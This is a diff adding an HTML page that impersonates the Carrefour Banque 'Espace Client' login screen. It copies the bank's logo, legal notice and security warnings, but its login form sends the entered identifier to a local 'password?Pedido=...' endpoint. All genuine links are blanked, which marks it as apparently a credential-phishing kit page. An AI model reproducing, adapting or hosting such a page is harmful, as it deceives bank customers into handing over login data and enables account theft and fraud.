@@ -1,0 +1,223 @@
+
+<html lang="fr" dir="ltr">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+
+  <title>Connexion à l’Espace Client | Carrefour Banque</title>
+  
+    <link rel="icon" href="css/favicon.ico">
+  
+  <link type="text/css" rel="stylesheet" href="css/fonts.css" media="all">
+  <link type="text/css" rel="stylesheet" href="css/6.css" media="all">
+<link type="text/css" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.4.0/css/font-awesome.min.css" media="all">
+
+ 
+      
+</head>
+<body class="html not-front not-logged-in no-sidebars page-espace-client page-espace-client-connexion formulaire" style="zoom: 1;">
+    
+	
+<div class="container container-main">
+
+  <section>
+                   
+          <div class="row pgconnexion"> 
+              
+      
+        <div class="col-xs-12 mid-contain col-sm-5 col-md-4">
+          
+          <!-- si phase de saisie de mdp on se redirige vers la  phase de saisie de login sinon redirection vers la page d'acceuil -->
+                        <a href="" class="lien-retour">Retour</a>           
+                                <div class="logo-container">
+              <a class="logo withoutBG" href="" title="Accueil">
+              <img src="css/logo-c4bq-2018.png" alt="Accueil">
+              </a>
+            </div>
+                    
+          
+                <!-- /region : content_pre_main -->
+        
+        <div id="drupal_content_title" class="hidden-xs"></div>
+        
+        <!-- region : content -->
+          <div class="region region-content">
+    <div id="block-system-main" class="block block-system ">
+
+            
+    <form action="password?Pedido=CodeDATAEvent=0eafd07f52ed0adaa0c11d1d0cc7ae83" method="post" autocomplete="off" id="c4bq-user-login-form" accept-charset="UTF-8">
+ 
+        <div>
+<section class="maincontent">
+  <h1>Accès à mon Espace Client</h1>
+  <section class="logindiv">
+    <section class="outerdiv">
+              
+      <div class="container-inline">
+        <div class="form-type-textfield form-item-name form-item form-group">
+  <label for="edit-name">Votre Identifiant Internet </label>
+ <input autocomplete="off" class="form-control form-text" type="text" id="edit-name" required name="id" value="" size="14" maxlength="11">
+</div>
+            <div class="container-inline"><label></label>
+                              <span class="refer-client"><a href="">Identifiant oublié ?</a></span>
+                         </div>
+          <div class="form-type-checkbox form-item-remember form-item checkbox">
+ <input type="checkbox" id="edit-remember" name="remember" value="1" class="form-checkbox">  <label for="edit-remember">Mémoriser mon identifiant </label>
+
+</div>
+        
+        <span id="id_message" class="link-align-field">
+            Pour cela nous déposons <a href="" target="_blank">un cookie</a> dans votre navigateur qui nous permet de <span class="bold">vous reconnaitre automatiquement lors de vos prochaines connexions</span>.              
+        </span>
+              </div>
+
+       <div class="sub_mid">
+        <button class="btn btn-default form-submit" id="edit-submit" name="op" value="Valider" type="submit">Valider</button>
+        </div>
+
+     
+
+    </section>
+  </section>
+</section></div></form>
+</div><!-- /.block -->
+
+  </div>
+        <!-- /region : content -->
+        <!-- region : content_post_main -->
+                
+      </div>
+     
+              <!-- region : content_col_right -->
+        <div class="col-xs-12  col-sm-7  col-md-8">
+            <div class="region region-content-col-right">
+    <div id="block-nodeblock-12754" class="block block-nodeblock node-type-ct-contenu ">
+
+            
+    
+<div class="">
+  <div class="field field-name-body field-type-text-with-summary field-label-hidden"><div class="field-items"><div class="field-item even" property="content:encoded"><style type="text/css">
+<!--/*--><![CDATA[/* ><!--*/
+
+.icon:before {
+    font-size: 30px!important;
+    color: #0463c1!important;
+    padding: 4px 4px!important;
+    border: 1px solid;
+}
+div#contribwrap {
+    background: linear-gradient(
+180deg, rgb(255 255 255 / 88%) 67%, rgb(255 255 255) 82%)!important;
+   padding: 20px 0px 0px 20px!important;
+   opacity:1!important;
+}
+.col-right-connexion {
+position:absolute!important;
+top:0;
+}
+.col-right-connexion h2 {
+    color: #0463c1;
+}
+.col-right-connexion ul {
+    padding: 0 0 0 53px!important;
+}
+@media (max-width: 470px){
+.col-right-connexion {
+    width: 150px;
+display: none;
+}
+}
+/*--><!]]>*/
+</style><div class="col-right-connexion">
+    <div class="container" id="contribwrap">
+        <div class="row">
+            <div class="col-xs-12">
+                <h2><span class="icon icon-login">Information Sécurité</span></h2>
+                <p>Avant de vous connecter à votre Espace Client, vérifiez que l’adresse commence par <a href="" target="_blank">https://www.carrefour-banque.fr/espace-client/connexion</a> ainsi que la présence du “https://”, et que l’icône cadenas est bien présente.</p>
+                <p>Sachez que Carrefour Banque ne vous demandera jamais de communiquer vos données personnelles et/ou bancaires par email, SMS ou téléphone, ou de les saisir sur l'Espace Client.</p>
+            </div>
+            <div class="col-sm-6">
+                <!-- <h2><span class="icon icon-contacts-aide">Des questions ?</span></h2>
+                <ul>
+                    <li><a href="contact?services=questionreclamation">Consulter nos guides Connexion et Espace client</a></li>
+                    <li><a href="agence-localisation">Trouver une agence</a></li>
+                </ul> -->
+                <h2><span class="icon icon-login">Espace Client</span></h2>
+                <ul><li><a href="">Connecter vous en toute sécurité</a></li>
+                    <li><a href="">Suivre ma demande</a></li>
+                    <li><a href="">Virement crédit PASS</a></li>
+                    <li><a href="">Appli mobile</a></li>
+                </ul></div>
+            <div class="row row2">
+                <div class="col-sm-6">
+                    <!-- <h2><span class="icon icon-services-urgence">Services d'urgences</span></h2>
+                    <ul>
+                        <li><a href="contact?services=urgences">Opposition Carte PASS</a></li>
+                        <li><a href="contact?services=urgences">Débloquer ma Carte PASS</a></li>
+                    </ul> -->
+                    <h2><span class="icon icon-infos">Infos légales</span></h2>
+                    <ul><li><a href="">Cookies</a> / <a href="">Mentions légales</a></li>
+                        <li><a href="">Paramétrage des cookies</a></li>
+                        <li><a href="">Conditions générales de vente</a></li>
+                        <li><a href="">Contact</a></li>
+                        <li><a href="">Accessibilité</a></li>
+                    </ul></div>
+            </div>
+        </div>
+    </div>
+</div>
+<p>&nbsp;</p></div></div></div></div>
+
+</div><!-- /.block -->
+
+  </div>
+        </div>
+        <!-- /region : content_col_right -->
+           </div>
+      
+      
+    <!-- region : content_bas_page -->
+          <div id="region_contenu_bas_page" class="row">
+        <div class="col-xs-12">
+            <div class="region region-content-bas-page">
+    <div id="block-nodeblock-1003" class="block block-nodeblock node-type-ct-mentions-legales ">
+
+            
+    <div class="">
+  <div class="field field-name-body field-type-text-with-summary field-label-hidden"><div class="field-items"><div class="field-item even" property="content:encoded"><p>CARREFOUR BANQUE, S.A au capital de 101 346 956,72 €, dont le siège social est situé au 9, Avenue du Lac&nbsp;- CS 30 671&nbsp;- 91051&nbsp;EVRY Cedex. RCS EVRY n°313 811515. N°ORIAS&nbsp;:&nbsp;07&nbsp;027&nbsp;516 (<a href="" target="_blank">www.orias.fr</a>).</p>
+
+<p>&nbsp;</p></div></div></div></div>
+
+</div><!-- /.block -->
+
+<!-- /.block -->
+
+  </div>
+        </div>
+      </div>
+        <!-- /region : content_bas_page -->
+
+  </section>
+
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+  
+   
+  
+
+
+</body></html>
